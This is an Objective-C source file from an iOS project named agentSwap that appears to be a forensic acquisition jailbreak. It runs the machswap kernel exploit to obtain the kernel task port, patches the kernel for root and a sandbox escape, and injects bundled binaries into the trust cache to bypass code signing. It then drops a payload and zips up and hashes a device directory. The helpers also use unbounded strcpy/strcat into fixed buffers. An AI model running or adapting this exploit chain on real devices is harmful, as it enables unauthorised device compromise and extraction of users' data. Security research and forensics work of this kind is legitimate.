//
//  jailbreak.m
//  agentSwap
//
//  Created by Davide Ornaghi on 19/09/21.
//

#import <Foundation/Foundation.h>
#import "ViewController.h"
#import "headers/common.h"
#include <pwd.h>
#include "machswap/machswap_pwn.h"
#import "kern_utils/kernel_ops.h"
#import "kern_utils/kernel_utils.h"
#import "jailbreak.h"
#import "patchfinder/patchfinder64.h"
#import "kpatches.h"
#import "ArchiveFile.h"
#import <dirent.h>
#include <spawn.h>
#include "injector/inject.h"
#include "drop_payload.h"
#include <time.h>
#include <CommonCrypto/CommonDigest.h>

extern char **environ;

extern int (*pmap_load_trust_cache)(uint64_t, size_t);

void inject_trust_cache(NSMutableArray *toInjectToTrustCache) {
    if ([toInjectToTrustCache count] <= 0) {
        return;
    }
    LOG("Injecting %lu files to trust cache", toInjectToTrustCache.count);
    injectTrustCache(toInjectToTrustCache, find_trustcache(), pmap_load_trust_cache);
    LOG("Injected %lu files to trust cache", toInjectToTrustCache.count);
    [toInjectToTrustCache removeAllObjects];
}

void get_tfp0()
{
    host_t myHost = HOST_NULL;
    host_t myOriginalHost = HOST_NULL;
    bool exploit_success = NO;
    myHost = mach_host_self();
    if (!MACH_PORT_VALID(myHost))
        LOG("Unable to get host port");
    
    myOriginalHost = myHost;

    machswap_offsets_t *const machswap_offsets = get_machswap_offsets();
    if (machswap_offsets != NULL &&
        machswap_exploit(machswap_offsets) == ERR_SUCCESS &&
        MACH_PORT_VALID(tfp0) &&
        KERN_POINTER_VALID(kernel_base)) {
        exploit_success = YES;
    }

    if (kernel_slide == -1 && kernel_base != -1)
        kernel_slide = (kernel_base - STATIC_KERNEL_BASE_ADDRESS);
    LOG("tfp0: 0x%x", tfp0);
    LOG("kernel_base: " ADDR, kernel_base);
    LOG("kernel_slide: " ADDR, kernel_slide);
    

    if (exploit_success && ReadKernel32(kernel_base) != MACH_HEADER_MAGIC) {
        LOG("Unable to verify kernel_base.");
        exploit_success = NO;
    }
    if (!exploit_success) {
        LOG("Unable to exploit kernel. This is not an error. Reboot and try again.");
        exit(EXIT_FAILURE);
    }
    LOG("Successfully exploited kernel.");
    LOG("Exporting TFP0...");
    if (export_tfp0(myOriginalHost))
        LOG("Successfully exported TFP0.");
    
    return;
}

int is_regular_file(const char *path)
{
    struct stat path_stat;
    stat(path, &path_stat);
    return S_ISREG(path_stat.st_mode);
}

void myfilerecursive(const char *basePath, char** files, int* totalFiles) {
    char path[3000];
    struct dirent *dp;
    DIR *dir = opendir(basePath);
    if (!dir)
        return;

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
            strcpy(path, basePath);
            strcat(path, "/");
            strcat(path, dp->d_name);
            if (is_regular_file(path)) {
                files[*totalFiles] = malloc(strlen(path) + 1);
                strncpy(files[*totalFiles], path, strlen(path) + 1);
                (*totalFiles)++;
            }
            myfilerecursive(path, files, totalFiles);
        }
    }
    closedir(dir);
}

bool patch_kernel() {
    if (init_kernel(kread, kernel_base, NULL) == -1) {
        LOG("Error initializing kernel");
        return false;
    }
    LOG("Kernel initialized!");
    
    get_root();
    no_shenanigans();

    if (getuid() == 0) {
        LOG("Got root privileges!");
        return true;
    } else {
        return false;
    }
}

void getCurrentTime(char *buff) {
    char *newBuf = calloc(20, sizeof(char));
    time_t now = time(NULL);
    strftime(newBuf, 20, "%d-%m-%Y %H-%M-%S", localtime(&now));
    strcpy(buff, newBuf);
    free(newBuf);
}

void extractArchive(const char* path, char* outArchive) {
    char archive[200] = "/private/var/mobile/Media/acquisition-";
    char date[20] = "";
    char **files = malloc(150000 * sizeof(char *));
    
    getCurrentTime(date);

    strcat(archive, date);
    strcat(archive, ".zip");
    int numFiles = 0;
    myfilerecursive(path, files, &numFiles);
/*
    for (int i = 0; i < count; i++) {
        LOG("%s", files[i]);
    }
*/
    write_archive(archive, (const char **)files);
    strcpy(outArchive, archive);
}

void extract() {
    char* in_path = NULL;
    char* bundle_root = bundle_path();
    char **files = malloc(150000 * sizeof(char *));
    int numFiles = 0;
    NSMutableArray *toInjectToTrustCache = [[NSMutableArray alloc] init];
    
    asprintf(&in_path, "%s/binaries", bundle_root);
    myfilerecursive(in_path, files, &numFiles);
    for (int i = 0; i < numFiles; i++) {
        [toInjectToTrustCache addObject: [NSString stringWithUTF8String:files[i]]];
    }
    
    inject_trust_cache(toInjectToTrustCache);
    
    drop_payload();
}

void write_hashes(const char* path) {
    char **files = malloc(150000 * sizeof(char *));
    int numFiles = 0;
    myfilerecursive(path, files, &numFiles);
    char date[20] = "";
    getCurrentTime(date);
    char hashFile[200] = "/private/var/mobile/Media/hashes-";
    strcat(hashFile, date);
    strcat(hashFile, ".swap");
    
    NSOutputStream *stream = [[NSOutputStream alloc] initToFileAtPath:[NSString stringWithUTF8String:hashFile] append:YES];
    [stream open];
    for (int i = 0; i < numFiles; i++) {
        NSMutableData* macOut = [NSMutableData dataWithLength:CC_SHA256_DIGEST_LENGTH];
        NSData* fileData = [NSData dataWithContentsOfFile: [NSString stringWithUTF8String:files[i]]];
        CC_SHA256(fileData.bytes, (CC_LONG) fileData.length, macOut.mutableBytes);
        NSData *fileHash = [NSData dataWithBytes:macOut.mutableBytes length:32];
        NSString *filename = [NSString stringWithUTF8String:files[i]];
        
        NSString *record = [NSString stringWithFormat:@"%@: %@\r\n", filename, fileHash];

        NSData *strData = [record dataUsingEncoding:NSUTF8StringEncoding];
        [stream write:(uint8_t *)[strData bytes] maxLength:[strData length]];
    }
    [stream close];
}
